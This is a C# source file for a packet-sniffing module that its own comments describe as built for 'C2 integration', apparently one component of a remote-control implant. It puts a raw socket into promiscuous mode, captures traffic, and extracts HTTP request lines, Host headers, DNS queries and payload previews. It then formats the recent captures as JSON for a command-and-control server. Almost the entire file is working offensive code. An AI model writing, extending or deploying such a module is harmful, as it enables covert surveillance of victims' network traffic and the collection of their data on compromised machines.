using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.IO;
using System.Linq;
using System.Web.Script.Serialization;

namespace XYZ.modules
{
    /// <summary>
    /// Enhanced Network Sniffer with improved packet analysis and C2 integration
    /// </summary>
    public class NetworkSnifferModule
    {
        private Socket mainSocket;
        private byte[] byteData = new byte[65535];
        private bool isRunning = false;
        private List<PacketInfo> packetLog = new List<PacketInfo>();
        private readonly object logLock = new object();
        private Thread snifferThread;
        private DateTime sessionStart;
        private Dictionary<string, int> protocolStats = new Dictionary<string, int>();

        public class PacketInfo
        {
            public DateTime Timestamp { get; set; }
            public string Protocol { get; set; }
            public string SourceIP { get; set; }
            public int SourcePort { get; set; }
            public string DestinationIP { get; set; }
            public int DestinationPort { get; set; }
            public int PacketSize { get; set; }
            public string PayloadPreview { get; set; }
            public string DetectedService { get; set; } // HTTP, HTTPS, DNS, etc.
            public string AdditionalInfo { get; set; }
        }

        public void Start()
        {
            if (isRunning)
            {
                SecureLogger.LogWarning("NetworkSniffer", "Already running");
                return;
            }
            
            isRunning = true;
            sessionStart = DateTime.UtcNow;
            
            snifferThread = new Thread(SniffingLoop);
            snifferThread.IsBackground = true;
            snifferThread.Start();
            
            SecureLogger.LogInfo("NetworkSniffer", "Enhanced sniffer started");
        }

        public void Stop()
        {
            if (!isRunning) return;
            
            isRunning = false;
            try 
            { 
                if (mainSocket != null) 
                {
                    mainSocket.Close();
                    mainSocket = null;
                }
            } 
            catch (Exception ex)
            {
                SecureLogger.LogError("NetworkSniffer.Stop", ex);
            }
            
            SecureLogger.LogInfo("NetworkSniffer", "Sniffer stopped");
        }

        private void SniffingLoop()
        {
            try
            {
                // Find local IP
                string ip = GetLocalIP();
                if (string.IsNullOrEmpty(ip)) 
                {
                    SecureLogger.LogError("NetworkSniffer", new Exception("No IPv4 address found"));
                    LogError("No IPv4 address found - cannot start sniffer");
                    return;
                }

                mainSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
                mainSocket.Bind(new IPEndPoint(IPAddress.Parse(ip), 0));
                mainSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                
                byte[] byTrue = new byte[] { 1, 0, 0, 0 };
                byte[] byOut = new byte[4];
                // SIO_RCVALL = 0x98000001 - Promiscuous mode
                mainSocket.IOControl(unchecked((int)0x98000001), byTrue, byOut);

                mainSocket.BeginReceive(byteData, 0, byteData.Length, SocketFlags.None, new AsyncCallback(OnReceive), null);
                
                SecureLogger.LogInfo("NetworkSniffer", "Socket bound to " + ip + " in promiscuous mode");
                LogInfo("Sniffer active on " + ip);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("NetworkSniffer.Loop", ex);
                LogError("Sniffer error: " + ex.Message + " (Requires Administrator privileges)");
            }
        }

        private void OnReceive(IAsyncResult ar)
        {
            if (!isRunning) return;
            
            try
            {
                int nReceived = mainSocket.EndReceive(ar);
                if (nReceived > 0)
                {
                    ParsePacket(byteData, nReceived);
                }
                
                byteData = new byte[65535];
                if (isRunning && mainSocket != null)
                {
                    mainSocket.BeginReceive(byteData, 0, byteData.Length, SocketFlags.None, new AsyncCallback(OnReceive), null);
                }
            }
            catch (Exception ex)
            {
                if (isRunning) // Only log if we're still supposed to be running
                {
                    SecureLogger.LogError("NetworkSniffer.OnReceive", ex);
                }
            }
        }

        private void ParsePacket(byte[] data, int length)
        {
            try
            {
                if (length < 20) return; // Minimum IP header size

                byte protocol = data[9];
                int headerLength = (data[0] & 0x0F) * 4;
                
                if (headerLength < 20 || headerLength > length) return;

                byte[] srcBytes = new byte[4]; Array.Copy(data, 12, srcBytes, 0, 4);
                byte[] dstBytes = new byte[4]; Array.Copy(data, 16, dstBytes, 0, 4);
                
                string sourceIP = new IPAddress(srcBytes).ToString();
                string destIP = new IPAddress(dstBytes).ToString();
                
                // Support TCP (6), UDP (17), ICMP (1)
                if (protocol != 6 && protocol != 17 && protocol != 1) return;

                string protocolName = protocol == 6 ? "TCP" : (protocol == 17 ? "UDP" : "ICMP");
                
                PacketInfo packet = new PacketInfo
                {
                    Timestamp = DateTime.Now,
                    Protocol = protocolName,
                    SourceIP = sourceIP,
                    DestinationIP = destIP,
                    PacketSize = length,
                    SourcePort = 0,
                    DestinationPort = 0,
                    PayloadPreview = "",
                    DetectedService = "Unknown",
                    AdditionalInfo = ""
                };

                // Parse TCP/UDP ports and payload
                if (protocol == 6 || protocol == 17)
                {
                    if (length > headerLength + 4)
                    {
                        packet.SourcePort = (data[headerLength] << 8) + data[headerLength + 1];
                        packet.DestinationPort = (data[headerLength + 2] << 8) + data[headerLength + 3];
                        
                        // Detect service based on port
                        packet.DetectedService = DetectService(packet.DestinationPort, packet.SourcePort);
                        
                        // Extract payload
                        int dataStart = headerLength;
                        if (protocol == 6) // TCP
                        {
                            if (length > headerLength + 12)
                            {
                                int tcpHeaderLen = ((data[headerLength + 12] & 0xF0) >> 4) * 4;
                                dataStart += tcpHeaderLen;
                            }
                        }
                        else // UDP
                        {
                            dataStart += 8; // UDP header is fixed 8 bytes
                        }
                        
                        // Extract and analyze payload
                        int payloadLen = length - dataStart;
                        if (payloadLen > 0 && dataStart < length)
                        {
                            int previewLen = Math.Min(payloadLen, 128);
                            byte[] payloadBytes = new byte[previewLen];
                            Array.Copy(data, dataStart, payloadBytes, 0, previewLen);
                            
                            // Check for HTTP
                            string payloadText = Encoding.ASCII.GetString(payloadBytes);
                            if (payloadText.StartsWith("GET ") || payloadText.StartsWith("POST ") ||
                                payloadText.StartsWith("HTTP/"))
                            {
                                packet.DetectedService = "HTTP";
                                packet.AdditionalInfo = ExtractHTTPInfo(payloadText);
                            }
                            else if (packet.DestinationPort == 53 || packet.SourcePort == 53)
                            {
                                packet.DetectedService = "DNS";
                                packet.AdditionalInfo = ExtractDNSQuery(payloadBytes);
                            }
                            
                            // Create printable preview
                            packet.PayloadPreview = CreatePrintablePreview(payloadBytes);
                        }
                    }
                }
                else if (protocol == 1) // ICMP
                {
                    if (length > headerLength)
                    {
                        byte icmpType = data[headerLength];
                        packet.DetectedService = "ICMP";
                        packet.AdditionalInfo = GetICMPType(icmpType);
                    }
                }

                LogPacket(packet);
                UpdateStats(protocolName);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("NetworkSniffer.ParsePacket", ex);
            }
        }

        private string DetectService(int destPort, int sourcePort)
        {
            // Common ports
            if (destPort == 80 || sourcePort == 80) return "HTTP";
            if (destPort == 443 || sourcePort == 443) return "HTTPS";
            if (destPort == 53 || sourcePort == 53) return "DNS";
            if (destPort == 21 || sourcePort == 21) return "FTP";
            if (destPort == 22 || sourcePort == 22) return "SSH";
            if (destPort == 23 || sourcePort == 23) return "Telnet";
            if (destPort == 25 || sourcePort == 25) return "SMTP";
            if (destPort == 110 || sourcePort == 110) return "POP3";
            if (destPort == 143 || sourcePort == 143) return "IMAP";
            if (destPort == 3389 || sourcePort == 3389) return "RDP";
            if (destPort == 3306 || sourcePort == 3306) return "MySQL";
            if (destPort == 5432 || sourcePort == 5432) return "PostgreSQL";
            if (destPort == 27017 || sourcePort == 27017) return "MongoDB";
            
            return "Port " + destPort;
        }

        private string ExtractHTTPInfo(string payload)
        {
            try
            {
                // Extract first line and Host header
                var lines = payload.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                string firstLine = lines.Length > 0 ? lines[0] : "";
                string host = "";
                
                foreach (var line in lines)
                {
                    if (line.StartsWith("Host: ", StringComparison.OrdinalIgnoreCase))
                    {
                        host = line.Substring(6).Trim();
                        break;
                    }
                }
                
                return string.IsNullOrEmpty(host) ? firstLine : firstLine + " [" + host + "]";
            }
            catch
            {
                return "";
            }
        }

        private string ExtractDNSQuery(byte[] payload)
        {
            try
            {
                // Simple DNS query name extraction (starting at byte 12)
                if (payload.Length < 13) return "";
                
                StringBuilder domain = new StringBuilder();
                int pos = 12;
                
                while (pos < payload.Length && payload[pos] != 0)
                {
                    int len = payload[pos];
                    if (len == 0 || pos + len >= payload.Length) break;
                    
                    if (domain.Length > 0) domain.Append('.');
                    domain.Append(Encoding.ASCII.GetString(payload, pos + 1, len));
                    pos += len + 1;
                    
                    if (pos >= payload.Length) break;
                }
                
                return "Query: " + domain.ToString();
            }
            catch
            {
                return "";
            }
        }

        private string GetICMPType(byte type)
        {
            switch (type)
            {
                case 0: return "Echo Reply (Ping Response)";
                case 3: return "Destination Unreachable";
                case 8: return "Echo Request (Ping)";
                case 11: return "Time Exceeded";
                default: return "Type " + type;
            }
        }

        private string CreatePrintablePreview(byte[] data)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < Math.Min(data.Length, 64); i++)
            {
                char c = (char)data[i];
                sb.Append((c >= 32 && c <= 126) ? c : '.');
            }
            return sb.ToString();
        }

        private void UpdateStats(string protocol)
        {
            lock (logLock)
            {
                if (!protocolStats.ContainsKey(protocol))
                    protocolStats[protocol] = 0;
                protocolStats[protocol]++;
            }
        }

        private void LogPacket(PacketInfo packet)
        {
            lock (logLock)
            {
                // Keep last 1000 packets
                if (packetLog.Count >= 1000)
                    packetLog.RemoveAt(0);
                    
                packetLog.Add(packet);
            }
        }

        private void LogError(string message)
        {
            LogPacket(new PacketInfo
            {
                Timestamp = DateTime.Now,
                Protocol = "ERROR",
                SourceIP = "",
                DestinationIP = "",
                DetectedService = "System",
                AdditionalInfo = message
            });
        }

        private void LogInfo(string message)
        {
            LogPacket(new PacketInfo
            {
                Timestamp = DateTime.Now,
                Protocol = "INFO",
                SourceIP = "",
                DestinationIP = "",
                DetectedService = "System",
                AdditionalInfo = message
            });
        }

        /// <summary>
        /// Get logs as formatted string (for backward compatibility)
        /// </summary>
        public string GetLogs()
        {
            lock (logLock)
            {
                if (packetLog.Count == 0) return "";
                
                StringBuilder sb = new StringBuilder();
                // Get last 50 packets
                int start = Math.Max(0, packetLog.Count - 50);
                
                for (int i = start; i < packetLog.Count; i++)
                {
                    var p = packetLog[i];
                    sb.AppendFormat("[{0:HH:mm:ss}] {1,-5} {2}:{3} -> {4}:{5} | {6} | {7} {8}\n",
                        p.Timestamp,
                        p.Protocol,
                        p.SourceIP,
                        p.SourcePort,
                        p.DestinationIP,
                        p.DestinationPort,
                        p.DetectedService,
                        p.PayloadPreview,
                        p.AdditionalInfo);
                }
                
                return sb.ToString();
            }
        }

        /// <summary>
        /// Get logs as structured JSON for C2
        /// </summary>
        public string GetLogsJSON()
        {
            lock (logLock)
            {
                if (packetLog.Count == 0) return "[]";
                
                // Get last 50 packets
                int start = Math.Max(0, packetLog.Count - 50);
                var recentPackets = packetLog.Skip(start).ToList();
                
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                return serializer.Serialize(recentPackets);
            }
        }

        /// <summary>
        /// Get statistics summary
        /// </summary>
        public Dictionary<string, object> GetStatistics()
        {
            lock (logLock)
            {
                return new Dictionary<string, object>
                {
                    { "IsRunning", isRunning },
                    { "SessionStart", sessionStart },
                    { "SessionDuration", (DateTime.UtcNow - sessionStart).ToString() },
                    { "TotalPackets", packetLog.Count },
                    { "ProtocolDistribution", new Dictionary<string, int>(protocolStats) },
                    { "LocalIP", GetLocalIP() }
                };
            }
        }

        public void ClearLogs()
        {
            lock (logLock)
            {
                packetLog.Clear();
                protocolStats.Clear();
            }
        }

        private string GetLocalIP()
        {
            try 
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList) 
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                        return ip.ToString();
                }
            } 
            catch (Exception ex)
            {
                SecureLogger.LogError("NetworkSniffer.GetLocalIP", ex);
            }
            return "";
        }
    }
}
